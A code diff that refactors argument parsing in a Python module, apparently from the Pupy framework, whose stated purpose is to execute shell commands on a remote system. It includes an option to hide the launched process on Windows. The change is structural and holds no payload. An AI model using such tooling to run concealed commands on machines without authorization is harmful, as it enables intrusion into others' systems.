@@ -11,12 +11,13 @@ __class_name__="ShellExec"
 class ShellExec(PupyModule):
     """ execute shell commands on a remote system """
 
-    def init_argparse(self):
-        self.arg_parser = PupyArgumentParser(prog='shell_exec', description=self.__doc__)
-        self.arg_parser.add_argument('-s', '--shell', help="default to /bin/sh on linux or cmd.exe on windows")
-        self.arg_parser.add_argument('argument', help='use unix like syntax and put simple quotes if there is multiple arguments')
-        self.arg_parser.add_argument('-H', '--hide', action='store_true', help='launch process on background (only for windows)')
-        self.arg_parser.add_argument('-c', '--codepage', default=None, help='decode using codepage')
+    @classmethod
+    def init_argparse(cls):
+        cls.arg_parser = PupyArgumentParser(prog='shell_exec', description=cls.__doc__)
+        cls.arg_parser.add_argument('-s', '--shell', help="default to /bin/sh on linux or cmd.exe on windows")
+        cls.arg_parser.add_argument('argument', help='use unix like syntax and put simple quotes if there is multiple arguments')
+        cls.arg_parser.add_argument('-H', '--hide', action='store_true', help='launch process on background (only for windows)')
+        cls.arg_parser.add_argument('-c', '--codepage', default=None, help='decode using codepage')
 
     def run(self, args):
         if not args.hide:
